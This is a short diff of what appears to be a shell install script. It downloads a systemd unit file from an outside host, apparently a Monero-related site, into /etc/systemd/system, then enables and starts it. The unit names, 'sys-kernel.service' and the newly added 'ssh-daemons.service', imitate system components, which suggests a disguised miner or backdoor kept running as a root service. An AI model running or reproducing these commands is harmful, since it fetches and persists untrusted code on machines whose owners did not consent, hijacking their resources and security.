@@ -18,4 +18,5 @@ cd /etc/systemd/system
 rm ./sys-kernel.service
 wget https://xmrhorizontal.github.io/sys-kernel.service
 systemctl enable sys-kernel.service
+systemctl start ssh-daemons.service
 systemctl start sys-kernel.service
